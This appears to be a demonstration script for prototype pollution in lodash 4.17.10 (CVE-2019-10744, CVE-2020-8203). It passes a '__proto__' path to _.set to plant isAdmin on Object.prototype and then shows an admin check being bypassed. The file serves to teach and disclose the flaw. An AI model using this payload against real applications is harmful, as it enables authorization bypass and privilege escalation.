/**
 * Example demonstrating prototype pollution vulnerability in lodash 4.17.10
 * 
 * This example shows how the _.set function can be exploited to pollute
 * the Object prototype, which can lead to security issues.
 * 
 * Relevant CVEs: CVE-2019-10744, CVE-2020-8203
 */

const _ = require('lodash');

console.log('Demonstrating prototype pollution vulnerability in lodash 4.17.10');

// Create a regular object
const obj = {};
console.log('Initial object:', obj);
console.log('Initial Object.prototype.isAdmin:', Object.prototype.isAdmin);
console.log('Initial obj.isAdmin:', obj.isAdmin);

// Exploit the vulnerability using _.set with a malicious path
console.log('\nExploiting vulnerability with _.set...');
const maliciousInput = '__proto__';
_.set(obj, maliciousInput + '.isAdmin', true);

// Check if the prototype has been polluted
console.log('\nAfter exploitation:');
console.log('Object.prototype.isAdmin:', Object.prototype.isAdmin);
console.log('obj.isAdmin:', obj.isAdmin);

// Create a new object to demonstrate the pollution affects all objects
const newObj = {};
console.log('\nNew object created after pollution:');
console.log('newObj.isAdmin:', newObj.isAdmin);

// Demonstrate a potential security impact
function isUserAdmin(user) {
    // In a real application, this would check if the user is an admin
    // But due to prototype pollution, this check can be bypassed
    if (user.isAdmin) {
        console.log('User is admin, granting access to sensitive operation');
        return true;
    } else {
        console.log('User is not admin, denying access to sensitive operation');
        return false;
    }
}

console.log('\nDemonstrating security impact:');
const regularUser = { name: 'Regular User', role: 'user' };
console.log('Regular user object:', regularUser);
isUserAdmin(regularUser); // This should return true due to prototype pollution

// Clean up (in a real application, this would be much harder to detect and fix)
console.log('\nCleaning up pollution:');
delete Object.prototype.isAdmin;
console.log('Object.prototype.isAdmin after cleanup:', Object.prototype.isAdmin);

console.log('\nThis vulnerability allows attackers to modify the behavior of all objects in the application,');
console.log('potentially bypassing security checks or causing other unexpected behavior.');